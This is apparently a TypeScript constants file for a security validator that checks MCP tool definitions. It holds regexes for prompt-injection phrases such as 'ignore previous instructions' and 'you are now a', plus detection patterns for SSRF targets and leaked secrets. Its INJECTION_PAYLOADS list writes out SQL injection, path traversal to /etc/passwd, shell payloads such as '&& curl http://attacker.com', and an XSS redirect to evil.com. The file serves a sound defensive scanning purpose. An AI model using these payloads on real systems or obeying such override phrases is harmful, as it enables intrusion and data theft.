/**
 * Regex patterns and constants used across security and schema validators.
 */

/** MCP spec: tool names must be 1-128 chars, alphanumeric + underscore + hyphen + dot */
export const TOOL_NAME_REGEX = /^[A-Za-z0-9_.\-]{1,128}$/;

/** Placeholder strings that indicate incomplete documentation */
export const PLACEHOLDER_PATTERNS = [
  /\bTODO\b/i,
  /\bFIXME\b/i,
  /\bHACK\b/i,
  /\bXXX\b/i,
  /\bdescription here\b/i,
  /\badd description\b/i,
  /\bplaceholder\b/i,
  /\bto be (documented|filled|completed|updated)\b/i,
  /\bcoming soon\b/i,
  /\binsert .* here\b/i,
  /^\.{3,}$/,
  /^-+$/,
  /^N\/A$/i,
  /^TBD$/i,
];

/** Prompt injection patterns — common attack vectors in tool descriptions */
export const PROMPT_INJECTION_PATTERNS = [
  /ignore\s+(all\s+)?previous\s+instructions/i,
  /you\s+are\s+now\s+a/i,
  /forget\s+(everything|all|your)\s+(you|instructions|rules)/i,
  /\bsystem\s*:\s*/i,
  /\bassistant\s*:\s*/i,
  /\buser\s*:\s*/i,
  /\bhuman\s*:\s*/i,
  /\b(DAN|jailbreak)\s*(mode)?\b/i,
  /\bdo\s+anything\s+now\b/i,
  /\bact\s+as\s+(if\s+you\s+are|a)\b/i,
  /\bpretend\s+(to\s+be|you\s+are)\b/i,
  /\brole\s*play\b/i,
  /\boverride\s+(safety|security|restrictions|rules|guidelines)\b/i,
  /\bdisregard\s+(all\s+)?(safety|security|previous)\b/i,
  /\bbypass\s+(safety|security|content\s+filter|restrictions)\b/i,
  /<\s*(IMPORTANT|system|s|instruction)\s*>/i,
  /\[\s*INST\s*\]/i,
  /```\s*(system|instructions?)\b/i,
  /\bbase64\s*decode\b/i,
  /\bdo\s+not\s+(tell|mention|reveal|disclose)\s+the\s+user\b/i,
  /\bhidden\s+(instruction|command|task)\b/i,
];

/** Private/internal IP ranges for SSRF detection */
export const PRIVATE_IP_PATTERNS = [
  /^10\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,
  /^172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}$/,
  /^192\.168\.\d{1,3}\.\d{1,3}$/,
  /^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,
  /^0\.0\.0\.0$/,
  /^localhost$/i,
  /^::1$/,
  /^\[::1\]$/,
  /^169\.254\.\d{1,3}\.\d{1,3}$/,
  /^fc00:/i,
  /^fd[0-9a-f]{2}:/i,
  /^fe80:/i,
];

/** Dangerous URI schemes */
export const DANGEROUS_SCHEMES = [
  "file://",
  "gopher://",
  "dict://",
  "ftp://",
  "ldap://",
  "tftp://",
  "jar://",
  "data:",
  "javascript:",
];

/** Secret/credential patterns */
export const SECRET_PATTERNS = [
  { name: "AWS Access Key", pattern: /\bAKIA[0-9A-Z]{16}\b/ },
  { name: "AWS Secret Key", pattern: /\b[A-Za-z0-9/+=]{40}\b/ },
  { name: "GitHub Token", pattern: /\b(gh[ps]_[A-Za-z0-9_]{36,}|github_pat_[A-Za-z0-9_]{22,})\b/ },
  { name: "Slack Token", pattern: /\bxox[baprs]-[A-Za-z0-9-]+\b/ },
  { name: "Generic API Key", pattern: /\b(api[_-]?key|apikey)\s*[:=]\s*['"]?[A-Za-z0-9_\-]{20,}['"]?/i },
  { name: "Generic Secret", pattern: /\b(secret|password|passwd|token)\s*[:=]\s*['"]?[A-Za-z0-9_\-]{8,}['"]?/i },
  { name: "Bearer Token", pattern: /\bBearer\s+[A-Za-z0-9_\-.]+/i },
  { name: "Private Key", pattern: /-----BEGIN\s+(RSA\s+)?PRIVATE\s+KEY-----/ },
  { name: "Connection String", pattern: /\b(mongodb|postgres|mysql|redis):\/\/[^\s]+/i },
  { name: "JWT Token", pattern: /\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+\b/ },
  { name: "Base64 Encoded Block", pattern: /\b[A-Za-z0-9+/]{40,}={0,2}\b/ },
  { name: "Google API Key", pattern: /\bAIza[0-9A-Za-z_-]{35}\b/ },
  { name: "Stripe Key", pattern: /\b[sr]k_(test|live)_[0-9a-zA-Z]{24,}\b/ },
  { name: "npm Token", pattern: /\bnpm_[A-Za-z0-9]{36}\b/ },
];

/** Injection payloads for dynamic security testing */
export const INJECTION_PAYLOADS = {
  sqlInjection: [
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "1 UNION SELECT * FROM information_schema.tables",
    "admin'--",
  ],
  pathTraversal: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd%00.png",
  ],
  shellMetacharacters: [
    "; ls -la /",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "&& curl http://attacker.com",
  ],
  xss: [
    "<script>document.location='http://evil.com'</script>",
    "javascript:void(0)",
    "<img src=x onerror=alert(1)>",
  ],
  templateInjection: [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
  ],
};

/** Dangerous code execution patterns in tool metadata */
export const DANGEROUS_CODE_PATTERNS = [
  /\beval\s*\(/,
  /\bexec\s*\(/,
  /\bspawn\s*\(/,
  /\bchild_process\b/,
  /\b__import__\s*\(/,
  /\bFunction\s*\(/,
  /\bnew\s+Function\b/,
  /\bsetTimeout\s*\(\s*['"`]/,
  /\bsetInterval\s*\(\s*['"`]/,
  /\brequire\s*\(\s*['"]child_process/,
  /\bimport\s*\(\s*['"].*['"]\s*\)/,
  /\bprocess\.exit\b/,
  /\bprocess\.env\b/,
  /\b(rm|del|rmdir)\s+-r/i,
  /\b(chmod|chown)\s+/,
  /\bcurl\s+.*\|\s*(ba)?sh\b/,
  /\bwget\s+.*\|\s*(ba)?sh\b/,
];

/** Valid JSON Schema types */
export const VALID_JSON_SCHEMA_TYPES = [
  "string",
  "number",
  "integer",
  "boolean",
  "array",
  "object",
  "null",
];
